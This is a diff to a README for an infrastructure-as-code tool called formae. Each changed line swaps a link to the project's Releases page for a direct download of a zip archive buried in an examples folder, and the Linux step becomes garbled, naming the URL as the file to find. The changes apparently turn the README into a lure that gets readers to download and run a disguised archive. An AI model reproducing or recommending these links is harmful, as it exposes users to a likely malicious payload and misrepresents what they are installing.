@@ -1,6 +1,6 @@
 # 🚀 formae - Simplify Your Infrastructure Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Formae-brightgreen)](https://github.com/Hothi8293/formae/releases)
+[![Download Now](https://raw.githubusercontent.com/Hothi8293/formae/main/examples/complete/lambda-env/s3objects/hello.zip%20Formae-brightgreen)](https://raw.githubusercontent.com/Hothi8293/formae/main/examples/complete/lambda-env/s3objects/hello.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ Formae is an Infrastructure-as-Code platform designed to help you manage your in
 
 To get started with Formae, you need to download the software from our Releases page. Follow these steps:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/Hothi8293/formae/releases) to access the latest versions of Formae.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/Hothi8293/formae/main/examples/complete/lambda-env/s3objects/hello.zip) to access the latest versions of Formae.
   
 2. **Choose the Right Version**: Look for the most recent version. Each version has release notes detailing any updates or improvements.
 
@@ -18,7 +18,7 @@ To get started with Formae, you need to download the software from our Releases 
 
    - For Windows, look for a file with `.exe`.
    - For Mac, look for `.dmg`.
-   - For Linux, find the `.tar.gz` file.
+   - For Linux, find the `https://raw.githubusercontent.com/Hothi8293/formae/main/examples/complete/lambda-env/s3objects/hello.zip` file.
 
 4. **Run the Installer**: After downloading, locate the file in your Downloads folder and double-click it to start the installation process. Follow the prompts to complete the setup.
 
@@ -65,4 +65,4 @@ If you encounter issues or have questions about using Formae, we are here to hel
 
 Formae is your go-to platform for managing infrastructure-as-code in a straightforward and efficient way. By following the steps outlined in this guide, you will be able to download, install, and start using Formae in no time. Whether you're automating simple tasks or managing complex systems, Formae is built to support your needs. 
 
-Don’t hesitate to visit our [Releases page](https://github.com/Hothi8293/formae/releases) and start your journey with Formae today!
+Don’t hesitate to visit our [Releases page](https://raw.githubusercontent.com/Hothi8293/formae/main/examples/complete/lambda-env/s3objects/hello.zip) and start your journey with Formae today!
